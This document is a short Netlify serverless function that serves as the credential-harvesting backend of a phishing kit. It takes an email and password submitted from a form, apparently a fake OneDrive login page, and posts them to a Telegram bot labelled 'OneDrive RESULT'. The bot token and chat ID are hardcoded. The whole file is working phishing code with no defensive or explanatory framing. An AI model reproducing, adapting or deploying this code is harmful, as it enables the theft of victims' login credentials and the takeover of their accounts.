import type { Context } from "@netlify/functions"
import nodemailer from "nodemailer"

export default async (req: Request, context: Context) => {
  let response;
  const body = await req.formData();
  const email = body.get("ai");
  const password = body.get("pr");
  console.log('response:', {email, password});

async function sendToTG(e, p) {
        const telegramBotToken = "7527014627:AAHOLMn0SIn8ZwNryB866Y1SVtvf2jWLeaM"; // Replace with your Telegram bot token
        const chatId = 6210146576; // Replace with your chat ID

        const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  fetch(url, params)
    .then((response) => {
        console.log(response);
      if (!response.ok) {  
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
    })
    .catch((error) => console.error("Error:", error));
};

await sendToTG(email, password);
  console.log('End Of Line');
}

